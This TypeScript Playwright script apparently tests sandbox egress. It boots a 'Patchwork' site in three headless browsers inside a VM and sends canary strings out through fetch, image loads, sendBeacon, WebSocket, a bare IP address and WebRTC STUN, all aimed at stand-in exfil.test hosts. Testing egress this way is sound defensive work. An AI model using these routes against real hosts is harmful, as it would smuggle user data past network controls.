// Spike B: boot the Patchwork site in each browser inside the client VM, then
// send canaries through every egress route. Run with Node's type stripping.
// argv: <playwright-core dir> <site url> [browser]
import { createRequire } from "node:module";

type Browser = { newContext(): Promise<Context>; close(): Promise<void> };
type Context = { newPage(): Promise<Page>; close(): Promise<void> };
type Page = {
  goto(url: string): Promise<unknown>;
  waitForSelector(selector: string, options: { timeout: number }): Promise<unknown>;
  evaluate<A>(fn: (arg: A) => unknown, arg: A): Promise<unknown>;
  waitForTimeout(ms: number): Promise<void>;
};
type BrowserType = { launch(options: { headless: boolean }): Promise<Browser> };

const [playwrightDir, siteUrl, only] = process.argv.slice(2);
if (!playwrightDir || !siteUrl) throw new Error("usage: spike-probe.ts <playwright-core dir> <site url>");
const playwright = createRequire(import.meta.url)(playwrightDir) as Record<string, BrowserType>;

for (const name of only ? [only] : ["chromium", "firefox", "webkit"]) {
  const started = Date.now();
  const browser = await playwright[name]!.launch({ headless: true });
  try {
    const context = await browser.newContext();
    const page = await context.newPage();
    console.log(`LAUNCHED ${name} in ${Date.now() - started}ms`);
    await page.goto(siteUrl);
    console.log(`LOADED ${name} in ${Date.now() - started}ms`);
    await page.waitForSelector(".threepane-sidebar", { timeout: 180_000 });
    console.log(`BOOTED ${name} in ${Date.now() - started}ms`);
    await page.evaluate((browserName) => {
      const canary = (kind: string) => `canary-${browserName}-${kind}`;
      fetch(`http://${canary("fetch-host")}.exfil.test/?${canary("fetch-query")}`, { mode: "no-cors" }).catch(() => {});
      new Image().src = `http://img.exfil.test/${canary("image")}`;
      navigator.sendBeacon(`http://beacon.exfil.test/`, canary("beacon-body"));
      try {
        const ws = new WebSocket(`ws://ws.exfil.test/${canary("websocket")}`);
        ws.onopen = () => ws.send(canary("websocket-message"));
      } catch {}
      fetch(`http://198.51.100.7/${canary("ip-literal")}`, { mode: "no-cors" }).catch(() => {});
      const pc = new RTCPeerConnection({
        iceServers: [{ urls: [`stun:${canary("webrtc-stun")}.exfil.test:3478`, "stun:198.51.100.8:3478"] }],
      });
      pc.createDataChannel("x");
      void pc.createOffer().then((offer) => pc.setLocalDescription(offer));
    }, name);
    await page.waitForTimeout(8_000);
    await context.close();
  } finally {
    await browser.close();
  }
}
console.log("PROBES DONE");
